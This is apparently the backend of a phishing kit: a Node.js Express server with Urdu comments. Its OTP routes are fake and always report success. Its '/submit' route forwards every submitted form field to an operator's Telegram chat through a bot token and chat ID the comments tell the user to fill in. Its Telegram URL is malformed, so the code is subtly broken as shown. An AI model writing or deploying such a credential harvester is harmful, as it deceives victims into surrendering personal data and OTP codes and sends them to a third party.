const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// او ٹی پی کے فرضی روٹس
app.post('/send-otp', (req, res) => res.json({ success: true }));
app.post('/verify-otp', (req, res) => res.json({ success: true }));

// ٹیلی گرام پر ڈیٹا بھیجنے کا روٹ (اسے لازمی شامل کریں)
app.post('/submit', async (req, res) => {
    try {
        const formData = req.body;

        // ⚠️ اپنے بوٹ کا ٹوکن اور چیٹ آئی ڈی یہاں لکھیں
        const BOT_TOKEN = "7983196238:AAHTL..."; // اپنا پورا ٹوکن یہاں ڈالیں
        const CHAT_ID = "6197259..."; // اپنی چیٹ آئی ڈی یہاں ڈالیں

        let message = "📝 *New Form Submission*\n\n";
        for (const [key, value] of Object.entries(formData)) {
            message += `*${key}:* ${value}\n`;
        }

        const response = await fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) return res.status(500).json({ error: "Telegram API Error" });
        return res.status(200).json({ success: true });

    } catch (error) {
        return res.status(500).json({ error: "Internal Error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
